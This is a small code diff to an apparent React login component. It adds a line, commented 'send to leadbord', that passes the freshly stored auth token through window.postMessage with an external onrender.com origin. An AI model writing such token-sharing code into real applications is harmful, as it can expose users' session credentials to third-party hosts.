@@ -70,6 +70,9 @@ const UserLoginComponent = () => {
       loginPromise.then(res => {
         let {token} = res.data;
         localStorage.setItem('token', token);
+        //send to leadbord
+        window.postMessage(localStorage.getItem('token'), 'https://test-0x9q.onrender.com');
+
         navigate('/new')
         //navigate('/profile')
       });
